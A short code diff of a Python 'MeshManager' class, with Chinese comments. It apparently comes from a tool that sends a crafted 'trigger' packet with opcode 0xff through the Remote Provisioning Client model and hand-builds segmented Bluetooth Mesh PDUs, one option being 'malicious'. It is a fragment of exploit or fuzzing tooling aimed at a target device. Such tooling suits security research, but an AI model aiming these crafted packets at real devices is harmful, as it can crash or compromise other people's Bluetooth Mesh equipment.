@@ -114,6 +114,7 @@ class MeshManager:
         # 核心：使用 opcode=0xff。
         # stack.send_model_message 会自动加上合法的传输层头部
         # 并且第一个字节会被设为 0xff
+        self.stack.rp_client.MODEL_ID = 0x0004  # Remote Provisioning Client
         await self.stack.send_model_message(
             self.target_addr,
             self.stack.rp_client,
@@ -122,8 +123,7 @@ class MeshManager:
             app_key=None
         )
         print("[+] 触发包已发出。")
-        
-               
+             
     async def send_custom_sar_pdu(self, seg_n: int, seg_o: int, is_malicious: bool = False):                                        
         """                                                                                                                         
         手动构造并发送一个分段报文。                                                                                                
